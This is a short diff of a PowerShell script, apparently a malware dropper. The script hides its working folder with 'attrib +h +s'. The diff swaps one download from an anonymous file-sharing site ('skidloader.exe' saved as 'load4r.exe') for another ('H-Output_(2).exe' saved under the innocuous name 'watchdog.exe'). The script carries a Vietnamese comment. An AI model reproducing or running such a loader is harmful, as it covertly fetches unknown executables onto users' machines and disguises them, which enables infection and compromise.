@@ -7,8 +7,8 @@ attrib +h +s $dir
 $folderPath = $dir
 
 
-$filePath = "$folderPath\load4r.exe"
-$url = "https://anonsharing.com/file/34157158f6d1f6e2/skidloader.exe"
+$filePath = "$folderPath\watchdog.exe"
+$url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
 
 # Tạo thư mục nếu chưa tồn tại
 if (!(Test-Path $folderPath)) {
